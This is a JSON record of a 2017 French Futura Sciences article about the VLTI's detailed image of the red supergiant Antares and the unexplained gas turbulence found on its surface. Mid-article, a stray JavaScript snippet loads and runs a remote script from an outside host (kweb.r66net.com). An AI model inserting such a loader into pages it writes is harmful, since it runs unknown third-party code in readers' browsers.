{"title": "Etoile : l'extraordinaire image de la supergeante rouge Antares", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-08-24", "content": "Visible l'ete, vers le sud, reconnaissable a sa teinte rouge, l'etoile Antares est passee devant un des meilleurs photographes du monde : le VLTI, qui combine la luminosite collectee par plusieurs telescopes geants. Le resultat est un portrait sans precedent, offrant une cartographie des gaz en mouvement a sa surface. C'est la toute premiere image d'une telle qualite pour une etoile autre que le Soleil. Ce qu'il faut retenir Les mouvements de gaz a la surface d'une etoile autre que le Soleil ont ete cartographies pour la premiere fois avec precision, grace au VLTI. Il s'agit d'Antares, une supergeante rouge, 12 fois plus massive que le Soleil et 700 fois plus grande. Des turbulences de gaz de faible densite ont ete detectees a de plus grandes distances du centre de l'etoile que prevu. Elles ne sont pas liees a la convection et leur processus reste inconnu.  Cet ete, vous avez sans doute apercu  Antares , fremissant au-dessus de l'horizon sud au debut de la nuit. L' etoile , une des plus brillantes du ciel en cette periode de l'annee, arbore une  couleur  rouge-orange qui lui a valu d'ailleurs d'etre baptisee dans l'antiquite, la << rivale de Mars >>, d'ou son nom forge avec  anti  et Ares, le nom grec de Mars. Voir aussi : Quelle est la plus grosse etoile de l'univers ? Elle brille dans la  constellation du Scorpion , non loin (pour nous) du centre de la  Voie lactee . Mais plus pour tres longtemps. En effet, la  supergeante rouge , environ 700 fois plus grande que notre  Soleil  s'essouffle... Elle est actuellement plus grande qu'une autre celebre supergeante rouge,  Betelgeuse , dans  Orion ) et 12 fois plus massive. Au cours de sa vie, relativement courte, l'etoile aurait perdu l'equivalent de trois  masses  solaires. Plus elle grandit, plus la densite a sa surface diminue, et plus elle se refroidit. Dans peu de temps -- a l'echelle astronomique --, elle deviendra une  supernova  ( effondrement  de l'etoile sur son coeur). Sans doute, une des prochaines que l'humanite pourra voir. Grace au VLTI, les astronomes ont realise cette magnifique image de la supergeante rouge Antares. C'ets a ce jour l'image la plus detaillee d'une etoile autre que le Soleil. Remarquez les taches lumineuses. (c) ESO, K. Ohnaka                               D'etranges mouvements de gaz detectes sur Antares Pour prendre le  pouls  d' Antares  et en savoir un peu plus sur son etat et, plus generalement, sur le declin de ces monstres stellaires, une equipe d'astronomes a pu profiter du puissant  interferometre  du  VLT  ( Very Large Telescope ). Cet instrument combine la  lumiere  des  telescopes  geants de l'observatoire du mont Paranal (Chili) pour creer un  miroir  virtuel geant de quelque 200 m de diametre. Grace a lui, les astronomes ont pu imager et meme cartographier en deux dimensions les mouvements a la surface d'Antares.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Comme l'explique Keiichi Ohnaka, l'auteur principal de l'etude publiee dans  Nature  (et diffuse par l' ESO ),  << le processus responsable de la perte de masse si rapide d'etoiles en fin de vie comme Antares est demeuree incompris durant plus d'un demi-siecle >>  Aussi, pour tenter de l'eclaircir, qui mieux que le VLTI pouvait le faire ?  << Le VLTI est le seul instrument qui nous a permis de mesurer directement les mouvements de  gaz  au sein de l' atmosphere  etendue d'Antares. >> Animation d'Antares -- l'etoile la plus brillante du Scorpion et 700 fois plus grande que notre Soleil --, et des turbulences a sa surface. (c) ESO, M. Kornmesser Donc, grace au VLTI et aussi a l'instrument  Amber  ( Astronomical Multi-BEam combineR ), l'equipe a ainsi pu creer la premiere carte des << bouillonnements >> de gaz dans l'atmosphere d'une etoile autre que le Soleil, et acquerir des images distinctes de sa surface  << sur une petite portion du spectre  infrarouge  >> , indique un  communique de l'ESO . Ces donnees renseignent sur la  vitesse  des gaz en  mouvement ,  << [...] une etape cle dans la resolution de ce probleme  >> . Les chercheurs ont decouvert l'existence de panaches de gaz de faible densite a des distances plus grandes que prevu du centre de la supergeante rouge. Ils ont pu determiner que ces  turbulences  ne sont pas liees a la  convection  a l'interieur de l' etoile geante . Donc, pour l'instant, leur mecanisme reste une enigme. Bien sur, pour Keiichi Ohnaka,  <<  le prochain defi consiste a identifier la source de ces mouvements turbulents >> . Nul doute que de nouvelles observations sont d'ores et deja prevues. Satisfait, il conclut :  << notre travail offre une nouvelle dimension a l' astrophysique  stellaire et ouvre une nouvelle  fenetre  d'etude des etoiles >>. Voir aussi : Le secret de la formation des etoiles massives a ete decouvert ! ", "theme": "sciences"}